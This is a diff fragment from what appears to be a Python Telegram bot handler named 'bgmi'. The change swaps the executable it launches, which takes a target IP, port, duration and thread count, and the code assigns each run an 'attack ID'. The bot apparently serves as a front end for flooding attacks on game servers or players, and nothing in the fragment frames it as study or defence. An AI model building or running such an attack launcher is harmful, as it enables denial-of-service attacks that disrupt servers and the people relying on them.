@@ -165,7 +165,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     # Updated command to remove protocol (udp/tcp)
-    command = ['./veer', target_ip, str(port), str(duration), str(DEFAULT_THREADS)]
+    command = ['./bgmi', target_ip, str(port), str(duration), str(DEFAULT_THREADS)]
     try:
         process = subprocess.Popen(command)
         # Generate and display a unique attack ID
